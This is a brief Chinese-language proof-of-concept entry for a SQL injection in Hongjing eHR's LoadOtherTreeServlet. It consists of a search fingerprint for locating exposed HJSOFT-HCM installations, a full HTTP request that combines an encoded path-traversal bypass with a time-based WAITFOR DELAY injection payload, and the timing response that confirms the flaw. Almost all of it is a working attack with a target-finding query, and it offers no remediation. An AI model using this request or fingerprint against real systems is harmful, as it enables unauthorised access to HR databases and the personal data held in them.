# 宏景eHRLoadOtherTreeServletSQL注入漏洞

宏景eHRLoadOtherTreeServlet ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A5%27--&flag=1 HTTP/1.1`
- **响应特征**：400 响应时间>=5s